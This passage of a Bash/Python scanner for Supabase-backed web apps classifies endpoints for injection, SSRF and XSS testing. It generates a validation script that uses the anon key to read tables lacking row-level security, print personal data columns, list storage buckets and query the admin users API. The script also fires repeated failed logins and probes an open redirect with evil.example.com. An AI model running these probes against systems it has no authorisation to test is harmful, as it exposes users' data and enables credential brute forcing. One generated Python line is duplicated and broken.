    return rec


# ── Load and classify ────────────────────────────────────────────────────────
classified = []
seen = set()

def add(url, method, source, tag, accessible=False):
    if not url: return
    key = f"{method}:{path_of(url)}"
    if key in seen: return
    seen.add(key)
    classified.append(classify(url, method, source, tag, accessible))

# From endpoints.txt
if eps_file:
    try:
        with open(eps_file) as f:
            for line in f:
                p = line.strip().split('|')
                if len(p) >= 4:
                    add(p[1], p[0], p[2], p[3])
    except Exception: pass

# From apifuzz.json (accessible endpoints get higher scores)
if fuzz_file:
    try:
        d = json.load(open(fuzz_file))
        for ep in d.get('endpoints', []):
            url = ep.get('url', ep.get('path', ''))
            if not url.startswith('http'): continue
            add(url, ep.get('method', 'GET'), 'api-fuzz', 'discovered',
                accessible=ep.get('accessible', False))
    except Exception: pass


def top(lst, key, min_score=20, max_count=12):
    cands = [e for e in lst if not e.get('skip') and e.get(key, -100) >= min_score]
    cands.sort(key=lambda x: x.get(key, 0), reverse=True)
    return cands[:max_count]

result = {
    'total_classified'     : len(classified),
    'traversal_candidates' : top(classified, 'traversal_score', 20, 10),
    'injection_candidates' : top(classified, 'injection_score', 20, 15),
    'ssrf_candidates'      : top(classified, 'ssrf_score',      20, 10),
    'xss_candidates'       : top(classified, 'xss_score',       20, 10),
    'by_category': {}
}
for ep in classified:
    c = ep['category']
    result['by_category'][c] = result['by_category'].get(c, 0) + 1

print(f"Classified {len(classified)} endpoints:")
for cat, cnt in sorted(result['by_category'].items(), key=lambda x: -x[1]):
    print(f"  {cat:<25} {cnt}")
print()
print("Test candidates:")
print(f"  Traversal : {len(result['traversal_candidates'])}")
print(f"  Injection : {len(result['injection_candidates'])}")
print(f"  SSRF      : {len(result['ssrf_candidates'])}")
print(f"  XSS       : {len(result['xss_candidates'])}")

with open(out_file, 'w') as f:
    json.dump(result, f, indent=2)

ACADI_PYEOF

    # ── validate_findings generator ──────────────────────────────────────────
    cat > "${PYDIR}/gen_validate.py" << 'ACADI_PYEOF'
#!/usr/bin/env python3
"""
Gera validate_findings.sh baseado nos resultados reais do scan.
v2 — cores corretas, variaveis expandidas, sem duplicatas, chave completa.
"""
import sys, json, re, os, stat

findings_file  = sys.argv[1]
endpoints_file = sys.argv[2]
out_dir        = sys.argv[3]
app_url_arg    = sys.argv[4]
output_script  = sys.argv[5]

findings_raw = open(findings_file).read() if os.path.exists(findings_file) else ""
lines = findings_raw.splitlines()

# ── Extrair variáveis do scan ─────────────────────────────────────────────────
supabase_url = ""
anon_key     = ""
app_url      = app_url_arg or ""
tables_open  = []
user_tables  = []
tables_all   = []
vulns        = []
misconfigs   = []
rpcs         = []

for line in lines:
    line = line.strip()
    if line.startswith("SUPABASE_URL="):
        supabase_url = line.split("=", 1)[1].strip()
    elif line.startswith("ANON_KEY="):
        # Pegar a chave COMPLETA — se estiver truncada com "..." pegar do js_parse.json
        val = line.split("=", 1)[1].strip()
        if not val.endswith("..."):
            anon_key = val
        # Se truncada, tenta ler do js_parse.json
        if not anon_key or anon_key.endswith("..."):
            js_parse = os.path.join(out_dir, "js_parse.json")
            if os.path.exists(js_parse):
                try:
                    d = json.load(open(js_parse))
                    full = d.get("anon_key", "")
                    if full and not full.endswith("..."):
                        anon_key = full
                except: pass
        if not anon_key or anon_key.endswith("..."):
            anon_key = val  # usa o que tem
    elif line.startswith("APP_URL="):
        url_val = line.split("=", 1)[1].strip()
        if url_val and not url_val.startswith("https://") is False:
            app_url = url_val
    elif line.startswith("VULN:"):
        vulns.append(line[5:].strip())
    elif line.startswith("MISCONFIG:"):
        misconfigs.append(line[10:].strip())
    elif line.startswith("OPEN_TABLE:"):
        parts = line.split(":")
        if len(parts) >= 2:
            t = parts[1]
            if t not in tables_open:
                tables_open.append(t)
    elif line.startswith("USER_TABLE:"):
        t = line.split(":", 1)[1]
        if t not in user_tables and t not in tables_open:
            user_tables.append(t)
    elif line.startswith("CSV_EXPORT:"):
        t = line.split(":", 1)[1]
        # não adicionar duplicatas na lista open
        pass

# Ler tabelas do endpoints.txt
if os.path.exists(endpoints_file):
    for line in open(endpoints_file):
        m = re.search(r'table:(\w+)', line)
        if m and m.group(1) not in tables_all:
            tables_all.append(m.group(1))
        m2 = re.search(r'rpc:(\w+)', line)
        if m2 and m2.group(1) not in rpcs:
            rpcs.append(m2.group(1))

# Se APP_URL ainda não foi resolvida, tenta pegar do nome do output dir
if not app_url or app_url == supabase_url:
    domain = os.path.basename(os.path.abspath(out_dir)).replace("_", ".")
    app_url = f"https://{domain}"

# Flags de presença
has_cors        = "CORS:WILDCARD" in findings_raw
has_rate_limit  = any("rate limit" in v.lower() for v in vulns)
has_open_tables = bool(tables_open)
has_user_table  = bool(user_tables)
has_bucket      = "BUCKET_LIST:exposed" in findings_raw
has_auth_sett   = "AUTH_SETTINGS:exposed" in findings_raw
has_csp         = any("CSP" in m or "Content-Security-Policy" in m for m in misconfigs)
has_xfo         = any("X-Frame" in m or "clickjacking" in m for m in misconfigs)
has_http        = any("HTTP accessible" in v or "HTTPS" in v for v in vulns)
has_redirect    = any("redirect" in m.lower() for m in misconfigs)
has_csv         = "CSV_EXPORT:" in findings_raw
has_admin_api   = any("Admin users API" in v or "admin/users" in v for v in vulns)
has_jwt         = any("JWT" in v or "service_role" in v for v in vulns)
has_idor        = any("IDOR" in v or "BOLA" in v for v in vulns)

csv_tables = list(dict.fromkeys([
    line.split(":", 1)[1] for line in findings_raw.splitlines()
    if line.startswith("CSV_EXPORT:")
]))

if not supabase_url: supabase_url = "https://SEU_PROJETO.supabase.co"
if not anon_key:     anon_key     = "SUA_ANON_KEY"
if not app_url:      app_url      = "https://SEU_APP.com"

# ── Gerar script ─────────────────────────────────────────────────────────────
out = []
def w(s=""): out.append(s)

w("#!/usr/bin/env bash")
w("# =============================================================================")
w(f"# ACADILOVABLE — validate_findings.sh")
w(f"# Gerado de: {findings_file}")
w(f"# Autor: Thiago Muniz | linkedin.com/in/tmtic/")
w("# =============================================================================")
w("")
w(f'SUPABASE="{supabase_url}"')
w(f'ANON="{anon_key}"')
w(f'APP="{app_url}"')
w("")
# Cores usando $'...' — funciona em bash sem echo -e
w("RED=$'\\033[0;31m'")
w("GREEN=$'\\033[0;32m'")
w("YELLOW=$'\\033[1;33m'")
w("CYAN=$'\\033[0;36m'")
w("BOLD=$'\\033[1m'")
w("DIM=$'\\033[2m'")
w("NC=$'\\033[0m'")
w("")
w('pass() { echo -e "${GREEN}[VP CONFIRMADO]${NC} ${BOLD}$*${NC}"; }')
w('fail() { echo -e "${RED}[FALSO POSITIVO]${NC} ${BOLD}$*${NC}"; }')
w('skip() { echo -e "${YELLOW}[MANUAL]${NC} $* — verificar no browser"; }')
w('info() { echo -e "  ${DIM}$*${NC}"; }')
w('show() { echo -e "  ${DIM}\\$ $*${NC}"; }')
w('section() {')
w('  local n="$1" title="$2" desc="$3"')
w('  echo ""')
w('  echo -e "${CYAN}${BOLD}[${n}] ${title}${NC}"')
w('  echo -e "  ${DIM}${desc}${NC}"')
w('}')
w("")
w('echo ""')
w(f'echo -e "${{BOLD}}ACADILOVABLE — Validação de Findings${{NC}}"')
w(f'echo -e "${{DIM}}App: {app_url}${{NC}}"')
w(f'echo -e "${{DIM}}Supabase: {supabase_url}${{NC}}"')
w('echo ""')

n = 0  # finding counter

# ── CORS ─────────────────────────────────────────────────────────────────────
if has_cors:
    n += 1
    w(f'section "{n}" "CORS wildcard (*)" "Qualquer origem pode chamar a API Supabase"')
    w(f'show "curl -sI -H \'Origin: https://evil.example.com\' -H \\"apikey: $ANON\\" \\"$SUPABASE/rest/v1/\\" | grep -i access-control"')
    w('CORS_HDR=$(curl -sI \\')
    w('  -H \'Origin: https://evil.example.com\' \\')
    w('  -H "apikey: $ANON" \\')
    w('  "$SUPABASE/rest/v1/" 2>/dev/null | grep -i "access-control-allow-origin" | tr -d \'\\r\')')
    w('if echo "$CORS_HDR" | grep -q "\\*"; then')
    w('  pass "CORS wildcard confirmado"')
    w('  echo "  Resposta: $CORS_HDR"')
    tbl = tables_all[0] if tables_all else "tabela"
    w(f'  info "Prova no browser (console de qualquer site):"')
    w(f'  info \'fetch("$SUPABASE/rest/v1/{tbl}",{{headers:{{apikey:"$ANON"}}}})\'')
    w('  info "Recomendação: Supabase Dashboard > Auth > URL Configuration > CORS"')
    w('else')
    w('  fail "CORS está restrito"')
    w('  echo "  Resposta: $CORS_HDR"')
    w('fi')

# ── OPEN TABLES (sem duplicatas) ──────────────────────────────────────────────
seen_tables = set()
for tbl in tables_open:
    if tbl in seen_tables:
        continue
    seen_tables.add(tbl)
    n += 1
    w("")
    w(f'section "{n}" "RLS ausente — tabela {tbl}" "Dados acessíveis com anon key"')
    w(f'show "curl -s \\"$SUPABASE/rest/v1/{tbl}?select=*&limit=3\\" -H \\"apikey: $ANON\\""')
    w(f'HTTP_{tbl.upper()}=$(curl -o /dev/null -s -w \'%{{http_code}}\' \\')
    w(f'  -H "apikey: $ANON" -H "Authorization: Bearer $ANON" \\')
    w(f'  "$SUPABASE/rest/v1/{tbl}?select=*&limit=3" 2>/dev/null)')
    w(f'BODY_{tbl.upper()}=$(curl -s \\')
    w(f'  -H "apikey: $ANON" -H "Authorization: Bearer $ANON" \\')
    w(f'  "$SUPABASE/rest/v1/{tbl}?select=*&limit=3" 2>/dev/null)')
    w(f'ROWS_{tbl.upper()}=$(echo "$BODY_{tbl.upper()}" | python3 -c \'')
    w(f'import sys,json')
    w(f'try:')
    w(f'  d=json.load(sys.stdin)')
    w(f'  print(len(d) if isinstance(d,list) else 0)')
    w(f'except: print(0)')
    w(f'\' 2>/dev/null || echo 0)')
    w(f'if [[ "$HTTP_{tbl.upper()}" == "200" && "$ROWS_{tbl.upper()}" -gt 0 ]]; then')
    w(f'  pass "HTTP $HTTP_{tbl.upper()} — {tbl} retorna $ROWS_{tbl.upper()} linha(s) com anon key"')
    w(f'  echo "$BODY_{tbl.upper()}" | python3 -c \'')
    w(f'import sys,json')
    w(f'try:')
    w(f'  rows=json.load(sys.stdin)')
    w(f'  for r in rows[:2]:')
    w(f'    p={{k:str(v)[:35] for k,v in list(r.items())[:5]}}')
    w(f'    print("   ",json.dumps(p,ensure_ascii=False))')
    w(f'except: pass')
    w(f'\' 2>/dev/null')
    w(f'  echo "  Fix: ALTER TABLE {tbl} ENABLE ROW LEVEL SECURITY;"')
    w(f'elif echo "$BODY_{tbl.upper()}" | grep -qi "message\\|error\\|invalid"; then')
    w(f'  fail "RLS ativo ou chave inválida (HTTP $HTTP_{tbl.upper()})"')
    w(f'  echo "  Resposta: $(echo \\"$BODY_{tbl.upper()}\\" | python3 -c \'import sys,json; d=json.load(sys.stdin); print(d.get(chr(109)+chr(101)+chr(115)+chr(115)+chr(97)+chr(103)+chr(101),d.get(chr(101)+chr(114)+chr(114)+chr(111)+chr(114),chr(63)))\' 2>/dev/null || echo unknown)"')
    w(f'else')
    w(f'  echo "  HTTP $HTTP_{tbl.upper()} — resposta: $(echo \\"$BODY_{tbl.upper()}\\" | head -c 100)"')
    w(f'fi')

# ── USER TABLES ───────────────────────────────────────────────────────────────
for tbl in user_tables:
    if tbl in seen_tables:
        continue
    seen_tables.add(tbl)
    n += 1
    w("")
    w(f'section "{n}" "Dados de usuários — tabela {tbl}" "PII potencialmente exposto"')
    w(f'show "curl -s \\"$SUPABASE/rest/v1/{tbl}?select=*&limit=5\\" -H \\"apikey: $ANON\\""')
    w(f'HTTP_U_{tbl.upper()}=$(curl -o /dev/null -s -w \'%{{http_code}}\' \\')
    w(f'  -H "apikey: $ANON" -H "Authorization: Bearer $ANON" \\')
    w(f'  "$SUPABASE/rest/v1/{tbl}?select=*&limit=5" 2>/dev/null)')
    w(f'BODY_U_{tbl.upper()}=$(curl -s \\')
    w(f'  -H "apikey: $ANON" -H "Authorization: Bearer $ANON" \\')
    w(f'  "$SUPABASE/rest/v1/{tbl}?select=*&limit=5" 2>/dev/null)')
    w(f'ROWS_U_{tbl.upper()}=$(echo "$BODY_U_{tbl.upper()}" | python3 -c \'import sys,json; d=json.load(sys.stdin); print(len(d) if isinstance(d,list) else 0)\' 2>/dev/null || echo 0)')
    w(f'if [[ "$HTTP_U_{tbl.upper()}" == "200" && "$ROWS_U_{tbl.upper()}" -gt 0 ]]; then')
    w(f'  pass "Dados de usuários em {tbl}: $ROWS_U_{tbl.upper()} linha(s)"')
    w(f'  echo "$BODY_U_{tbl.upper()}" | python3 -c \'')
    w(f'import sys,json,re')
    w(f'pii=re.compile(r"email|phone|name|cpf|avatar|address|birth",re.I)')
    w(f'try:')
    w(f'  rows=json.load(sys.stdin)')
    w(f'  if rows and isinstance(rows[0],dict):')
    w(f'    pii_cols=[c for c in rows[0].keys() if pii.search(c)]')
    w(f'    if pii_cols: print(f"  PII detectado: {{pii_cols}}")')
    w(f'    for r in rows[:2]: print("   ",json.dumps({{k:str(v)[:30] for k,v in list(r.items())[:5]}},ensure_ascii=False))')
    w(f'except: pass')
    w(f'\' 2>/dev/null')
    w(f'  echo "  Fix: ALTER TABLE {tbl} ENABLE ROW LEVEL SECURITY;"')
    w(f'else')
    w(f'  fail "Tabela {tbl} protegida (HTTP $HTTP_U_{tbl.upper()})"')
    w(f'fi')

# ── AUTH SETTINGS ─────────────────────────────────────────────────────────────
if has_auth_sett:
    n += 1
    w("")
    w(f'section "{n}" "Auth settings exposto" "Configurações de autenticação legíveis"')
    w(f'show "curl -s \\"$SUPABASE/auth/v1/settings\\" -H \\"apikey: $ANON\\""')
    w('HTTP_AS=$(curl -o /dev/null -s -w \'%{http_code}\' "$SUPABASE/auth/v1/settings" -H "apikey: $ANON" 2>/dev/null)')
    w('BODY_AS=$(curl -s "$SUPABASE/auth/v1/settings" -H "apikey: $ANON" 2>/dev/null)')
    w('if [[ "$HTTP_AS" == "200" ]]; then')
    w('  pass "Auth settings acessível (HTTP 200)"')
    w('  echo "$BODY_AS" | python3 -c \'')
    w('import sys,json')
    w('try:')
    w('  d=json.load(sys.stdin)')
    w('  for k in ["disable_signup","mailer_autoconfirm","external_email_enabled"]:[')
    w('  for k in ["disable_signup","mailer_autoconfirm","external_email_enabled"]:')
    w('    if k in d: print(f"  {k}: {d[k]}")')
    w('  if d.get("mailer_autoconfirm"): print("  RISCO: autoconfirm=true")')
    w('except: pass')
    w('\' 2>/dev/null')
    w('else')
    w('  fail "Auth settings protegido (HTTP $HTTP_AS)"')
    w('fi')

# ── CSP ───────────────────────────────────────────────────────────────────────
if has_csp:
    n += 1
    w("")
    w(f'section "{n}" "Content-Security-Policy ausente" "Sem barreira contra XSS"')
    w(f'show "curl -sI {app_url}/ | grep -i content-security-policy"')
    w(f'CSP_HDR=$(curl -sI --max-time 8 "{app_url}/" 2>/dev/null | grep -i "^content-security-policy:" | tr -d \'\\r\')')
    w('if [[ -z "$CSP_HDR" ]]; then')
    w('  pass "CSP ausente confirmado"')
    w('  info "Recomendação: Content-Security-Policy: default-src \'self\'; script-src \'self\'"')
    w('else')
    w('  fail "CSP presente: $CSP_HDR"')
    w('fi')

# ── X-FRAME-OPTIONS ───────────────────────────────────────────────────────────
if has_xfo:
    n += 1
    w("")
    w(f'section "{n}" "X-Frame-Options ausente" "Vulnerável a clickjacking"')
    w(f'show "curl -sI {app_url}/ | grep -iE \'x-frame-options|frame-ancestors\'"')
    w(f'XFO_HDR=$(curl -sI --max-time 8 "{app_url}/" 2>/dev/null | grep -iE "^x-frame-options:|frame-ancestors" | tr -d \'\\r\')')
    w('if [[ -z "$XFO_HDR" ]]; then')
    w('  pass "Clickjacking confirmado — sem X-Frame-Options ou CSP frame-ancestors"')
    w(f'  info "Prova: salve e abra no browser:"')
    w(f'  info \'<html><body><iframe src="{app_url}/login" width="800" height="600"></iframe></body></html>\'')
    w('  info "Recomendação: X-Frame-Options: DENY"')
    w('else')
    w('  fail "Proteção presente: $XFO_HDR"')
    w('fi')

# ── HTTP sem HTTPS ────────────────────────────────────────────────────────────
if has_http:
    n += 1
    http_url = app_url.replace("https://", "http://")
    w("")
    w(f'section "{n}" "HTTP sem redirect para HTTPS" "Tráfego pode ser interceptado"')
    w(f'show "curl -sI --max-time 8 \'{http_url}/\' | head -3"')
    w(f'HTTP_CODE_H=$(curl -o /dev/null -s -w \'%{{http_code}}\' --max-time 8 \'{http_url}/\' 2>/dev/null || echo "ERR")')
    w(f'HTTP_LOC=$(curl -sI --max-time 8 \'{http_url}/\' 2>/dev/null | grep -i "^location:" | tr -d \'\\r\' || true)')
    w('if [[ "$HTTP_CODE_H" == "200" ]]; then')
    w('  pass "HTTP retorna 200 sem redirect para HTTPS"')
    w('  info "Impacto: cookies sem Secure flag viajam em texto claro"')
    w('elif [[ "$HTTP_CODE_H" == "301" || "$HTTP_CODE_H" == "302" ]]; then')
    w('  fail "Redireciona para HTTPS (HTTP $HTTP_CODE_H) → $HTTP_LOC"')
    w('else')
    w('  echo "  HTTP $HTTP_CODE_H — provável bloqueio de rede ou CDN"')
    w('fi')

# ── BUCKET LIST ───────────────────────────────────────────────────────────────
if has_bucket:
    n += 1
    w("")
    w(f'section "{n}" "Storage bucket list acessível" "Nomes de buckets expostos"')
    w('show "curl -s \\"$SUPABASE/storage/v1/bucket\\" -H \\"apikey: $ANON\\" -H \\"Authorization: Bearer $ANON\\""')
    w('HTTP_BK=$(curl -o /dev/null -s -w \'%{http_code}\' \\')
    w('  -H "apikey: $ANON" -H "Authorization: Bearer $ANON" \\')
    w('  "$SUPABASE/storage/v1/bucket" 2>/dev/null)')
    w('BODY_BK=$(curl -s \\')
    w('  -H "apikey: $ANON" -H "Authorization: Bearer $ANON" \\')
    w('  "$SUPABASE/storage/v1/bucket" 2>/dev/null)')
    w('if [[ "$HTTP_BK" == "200" ]]; then')
    w('  pass "Bucket list acessível (HTTP 200)"')
    w('  echo "$BODY_BK" | python3 -c \'')
    w('import sys,json')
    w('try:')
    w('  for b in json.load(sys.stdin):')
    w('    print(f"  bucket={b.get(chr(110)+chr(97)+chr(109)+chr(101),chr(63))}  public={b.get(chr(112)+chr(117)+chr(98)+chr(108)+chr(105)+chr(99),False)}")')
    w('except: pass')
    w('\' 2>/dev/null')
    w('else')
    w('  fail "Bucket list protegido (HTTP $HTTP_BK)"')
    w('fi')

# ── CSV EXPORT ────────────────────────────────────────────────────────────────
for tbl in csv_tables:
    n += 1
    w("")
    w(f'section "{n}" "CSV export — tabela {tbl}" "Dados exportáveis em CSV"')
    w(f'show "curl -s \\"$SUPABASE/rest/v1/{tbl}?select=*&limit=5\\" -H \\"apikey: $ANON\\" -H \'Accept: text/csv\'"')
    w(f'HTTP_CSV_{tbl.upper()}=$(curl -o /dev/null -s -w \'%{{http_code}}\' \\')
    w(f'  -H "apikey: $ANON" -H "Authorization: Bearer $ANON" -H "Accept: text/csv" \\')
    w(f'  "$SUPABASE/rest/v1/{tbl}?select=*&limit=5" 2>/dev/null)')
    w(f'BODY_CSV_{tbl.upper()}=$(curl -s \\')
    w(f'  -H "apikey: $ANON" -H "Authorization: Bearer $ANON" -H "Accept: text/csv" \\')
    w(f'  "$SUPABASE/rest/v1/{tbl}?select=*&limit=5" 2>/dev/null)')
    w(f'if [[ "$HTTP_CSV_{tbl.upper()}" == "200" ]] && echo "$BODY_CSV_{tbl.upper()}" | grep -q ","; then')
    w(f'  pass "CSV export ativo em {tbl}"')
    w(f'  echo "$BODY_CSV_{tbl.upper()}" | head -2 | while read -r csv_line; do echo "  $csv_line"; done')
    w(f'else')
    w(f'  fail "CSV export não funciona (HTTP $HTTP_CSV_{tbl.upper()})"')
    w(f'fi')

# ── RATE LIMITING ─────────────────────────────────────────────────────────────
if has_rate_limit:
    n += 1
    w("")
    w(f'section "{n}" "Rate limiting ausente" "Brute force sem bloqueio"')
    w('echo "  Enviando 10 requisições de login inválido..."')
    w('RL_CODES=""')
    w('RL_GOT_429=false')
    w('for i in 1 2 3 4 5 6 7 8 9 10; do')
    w('  RL_CODE=$(curl -o /dev/null -s -w \'%{http_code}\' -X POST \\')
    w('    "$SUPABASE/auth/v1/token?grant_type=password" \\')
    w('    -H "apikey: $ANON" -H "Content-Type: application/json" \\')
    w('    -d \'{"email":"ratelimit_test@invalid.test","password":"wrongpassword"}\' 2>/dev/null || echo "000")')
    w('  RL_CODES="$RL_CODES $RL_CODE"')
    w('  printf "  Req %2d: HTTP %s\\n" "$i" "$RL_CODE"')
    w('  [[ "$RL_CODE" == "429" ]] && RL_GOT_429=true')
    w('done')
    w('if $RL_GOT_429; then')
    w('  fail "Rate limiting ativo — recebeu 429"')
    w('else')
    w('  pass "Rate limiting AUSENTE — sem 429 em 10 tentativas"')
    w('  info "Respostas: $RL_CODES"')
    w('  info "Impacto: brute force de credenciais sem bloqueio"')
    w('  info "Recomendação: Supabase Dashboard > Auth > Rate Limits"')
    w('fi')

# ── OPEN REDIRECT ─────────────────────────────────────────────────────────────
if has_redirect:
    n += 1
    w("")
    w(f'section "{n}" "Open Redirect" "Verificar se redireciona para URL externa"')
    w(f'show "curl -sI --max-time 8 \'$APP/login?redirect=https://evil.example.com\' | grep -i location"')
    w('OA_CODE=$(curl -o /dev/null -s -w \'%{http_code}\' --max-time 8 "$APP/login?redirect=https://evil.example.com" 2>/dev/null)')
    w('OA_LOC=$(curl -sI --max-time 8 "$APP/login?redirect=https://evil.example.com" 2>/dev/null | grep -i "^location:" | tr -d \'\\r\' || true)')
    w('if echo "$OA_LOC" | grep -qi "evil.example.com"; then')
    w('  pass "Open redirect server-side confirmado! Location: $OA_LOC"')
    w('elif [[ "$OA_CODE" == "200" ]]; then')
    w('  skip "SPA retorna 200 — redirect é client-side"')
    w('  info "Teste: faça login e verifique se a URL muda para https://evil.example.com"')
    w('  info "Se sim: client-side open redirect. Se não: falso positivo."')
    w('else')
    w('  echo "  HTTP $OA_CODE — verificar manualmente"')
    w('fi')

# ── JWT ───────────────────────────────────────────────────────────────────────
if has_jwt:
    n += 1
    w("")
    w(f'section "{n}" "JWT — service_role ou sem expiração" "Chave crítica exposta"')
    w(f'show "echo \\"$ANON\\" | python3 -c \\"import sys,base64,json; p=sys.stdin.read().strip().split(chr(46)); print(json.dumps(json.loads(base64.urlsafe_b64decode(p[1]+chr(61)*4)),indent=2))\\""')
    w('JWT_INFO=$(echo "$ANON" | python3 -c \'')
    w('import sys,base64,json,time')
    w('try:')
    w('  parts=sys.stdin.read().strip().split(".")')
    w('  p=parts[1]+"=="')
    w('  d=json.loads(base64.urlsafe_b64decode(p))')
    w('  role=d.get("role","?")')
    w('  exp=d.get("exp")')
    w('  expstr="sem expiração" if not exp else "expira em "+str(__import__("datetime").datetime.utcfromtimestamp(exp))')
    w('  print(f"role={role} | {expstr}")')
    w('  if role=="service_role": print("CRITICO: service_role exposta!")')
    w('except Exception as e: print(f"erro: {e}")')
    w('\' 2>/dev/null || echo "erro ao decodificar")')
    w('echo "  Payload: $JWT_INFO"')
    w('if echo "$JWT_INFO" | grep -qi "service_role\\|CRITICO"; then')
    w('  pass "SERVICE ROLE key exposta no bundle — acesso total ao banco!"')
    w('elif echo "$JWT_INFO" | grep -qi "sem expiração"; then')
    w('  pass "Token sem expiração — acesso permanente com a chave do bundle"')
    w('else')
    w('  fail "Chave é anon com expiração — risco controlado"')
    w('fi')

# ── ADMIN API ─────────────────────────────────────────────────────────────────
if has_admin_api:
    n += 1
    w("")
    w(f'section "{n}" "Admin users API" "Lista de usuários sem privilégio admin"')
    w('show "curl -s \\"$SUPABASE/auth/v1/admin/users\\" -H \\"apikey: $ANON\\" -H \\"Authorization: Bearer $ANON\\""')
    w('HTTP_ADM=$(curl -o /dev/null -s -w \'%{http_code}\' \\')
    w('  -H "apikey: $ANON" -H "Authorization: Bearer $ANON" \\')
    w('  "$SUPABASE/auth/v1/admin/users?per_page=3" 2>/dev/null)')
    w('BODY_ADM=$(curl -s \\')
    w('  -H "apikey: $ANON" -H "Authorization: Bearer $ANON" \\')
    w('  "$SUPABASE/auth/v1/admin/users?per_page=3" 2>/dev/null)')
    w('if [[ "$HTTP_ADM" == "200" ]]; then')
    w('  pass "Admin users API retornou HTTP 200"')
    w('  echo "$BODY_ADM" | python3 -c \'')
    w('import sys,json')
    w('try:')
    w('  d=json.load(sys.stdin)')
    w('  users=d.get("users",d) if isinstance(d,dict) else d')
    w('  if isinstance(users,list):')
    w('    print(f"  Total: {len(users)} usuário(s)")')
    w('    for u in users[:3]:')
    w('      print(f"  id={str(u.get(chr(105)+chr(100),chr(63)))[:8]}...  email={u.get(chr(101)+chr(109)+chr(97)+chr(105)+chr(108),chr(63))}")')
    w('except: pass')
    w('\' 2>/dev/null')
    w('else')
    w('  fail "Admin API bloqueada (HTTP $HTTP_ADM)"')
    w('fi')

# ── SUMÁRIO ───────────────────────────────────────────────────────────────────
w("")
w('echo ""')
w(f'echo -e "${{CYAN}}${{BOLD}}═══════════════════════════════════════════════════${{NC}}"')
w(f'echo -e "${{CYAN}}${{BOLD}}  Validação concluída — {n} finding(s) verificado(s)${{NC}}"')
w(f'echo -e "${{CYAN}}${{BOLD}}═══════════════════════════════════════════════════${{NC}}"')
w('echo ""')
w(f'info "Schema completo do banco:"')
w(f'info "curl -s \\"$SUPABASE/rest/v1/\\" -H \'Accept: application/openapi+json\' -H \\"apikey: $ANON\\" | python3 -m json.tool"')
w('echo ""')

script_content = "\n".join(out)
with open(output_script, "w") as f:
    f.write(script_content)

os.chmod(output_script, os.stat(output_script).st_mode |
         stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH)

print(f"validate_findings.sh gerado: {n} finding(s) | {len(out)} linhas")

ACADI_PYEOF

    ok "Python helpers written to ${PYDIR}/ (20 files)"
}


# ─────────────────────────────────────────────────────────────────────────────
# ASSET DISCOVERY & DOWNLOAD
# ─────────────────────────────────────────────────────────────────────────────
fetch_assets() {
    # Try sw.js precache
    local sw; sw=$(hget "${APP_URL}/sw.js")
    if [[ -n "$sw" ]]; then
        local urls; urls=$(echo "$sw" | python3 "${PYDIR}/precache.py" 2>/dev/null || true)
        [[ -n "$urls" ]] && { echo "$urls"; return; }
    fi
    # Fallback: index.html
    local idx; idx=$(hget "${APP_URL}/")
    [[ -n "$idx" ]] && echo "$idx" | python3 "${PYDIR}/idx.py" 2>/dev/null || true
}

download_assets() {
    local -a urls=("$@")
    info "Downloading ${#urls[@]} asset(s)..."
    for route in "${urls[@]}"; do
        local clean="${route#/}"
        verb "↓ ${route}"
        curl -sS --max-time "$TIMEOUT" -A "$UA" \
             -o "${OUT_DIR}/$(basename "$route")" \
             "${APP_URL}/${clean}" 2>/dev/null | tr -d '\000' || true
    done
}

find_bundle() {
    find "$OUT_DIR" -maxdepth 1 -name "*.js" -type f \
         -printf '%s %p\n' 2>/dev/null | sort -rn | head -1 | awk '{print $2}'
}

# ─────────────────────────────────────────────────────────────────────────────
# BUNDLE ANALYSIS
# ─────────────────────────────────────────────────────────────────────────────
analyse_bundle() {
    local bundle_file="${OUT_DIR}/bundle.txt"
    [[ ! -f "$bundle_file" ]] && { warn "No bundle file found"; return; }

    section "BUNDLE ANALYSIS"
    local parsed; parsed=$(python3 "${PYDIR}/extract.py" "all" < "$bundle_file" 2>/dev/null || echo '{}')
    echo "$parsed" > "${OUT_DIR}/js_parse.json"

    # Extract Supabase config
    SUPABASE=$(python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('supabase_url',''))" <<< "$parsed" 2>/dev/null || true)
    ANON_KEY=$(python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('anon_key',''))"    <<< "$parsed" 2>/dev/null || true)

    [[ -z "$SUPABASE" ]] && SUPABASE="{SUPABASE_URL}"
    [[ -z "$ANON_KEY" ]] && { warn "No anon key found — Supabase tests will be skipped"; }

    if [[ "$SUPABASE" != "{SUPABASE_URL}" ]]; then
        ok "Supabase URL : $SUPABASE"
        ok "anon key     : ${ANON_KEY:0:48}..."
        log "SUPABASE_URL=$SUPABASE"
        log "ANON_KEY=${ANON_KEY}"
        log "APP_URL=$APP_URL"
    fi

    # Extract arrays
    readarray -t TABLES   < <(python3 -c "import json,sys; [print(t) for t in json.load(sys.stdin).get('tables',[])]"   2>/dev/null <<< "$parsed" || true)
    readarray -t RPCS     < <(python3 -c "import json,sys; [print(r) for r in json.load(sys.stdin).get('rpcs',[])]"     2>/dev/null <<< "$parsed" || true)
    readarray -t EDGES    < <(python3 -c "import json,sys; [print(e) for e in json.load(sys.stdin).get('edges',[])]"    2>/dev/null <<< "$parsed" || true)
    readarray -t BUCKETS  < <(python3 -c "import json,sys; [print(b) for b in json.load(sys.stdin).get('buckets',[])]"  2>/dev/null <<< "$parsed" || true)
    readarray -t ROUTES   < <(python3 -c "import json,sys; [print(r) for r in json.load(sys.stdin).get('routes',[])]"   2>/dev/null <<< "$parsed" || true)
    readarray -t APICALLS < <(python3 -c "
import json,sys
d=json.load(sys.stdin)
for ep in d.get('api',[]):
    for m in ep.get('methods',['GET']): print(m+'||'+ep['path'])
" 2>/dev/null <<< "$parsed" || true)

    ok "Tables: ${#TABLES[@]}  RPCs: ${#RPCS[@]}  Edges: ${#EDGES[@]}  Routes: ${#ROUTES[@]}  API calls: ${#APICALLS[@]}"
    for t in "${TABLES[@]}";   do verb "  table  → $t"; done
    for r in "${RPCS[@]}";     do verb "  rpc    → $r"; done
    for r in "${ROUTES[@]}";   do verb "  route  → $r"; done

    # RLS analysis
    python3 -c "
import json,sys
d=json.load(sys.stdin)
for c in d.get('chains',[]):
    op=c.get('op','?'); tbl=c.get('table','?')
    cols=','.join(c.get('cols',[])[:6]) or '*'
    rls='' if c.get('has_rls') or op!='select' else '  \033[1;33m⚠ NO_USER_FILTER\033[0m'
    print(f'  [{op.upper():6}] {tbl:<25} cols=[{cols[:40]}]{rls}')
" 2>/dev/null <<< "$parsed" || true

    # Secrets in bundle
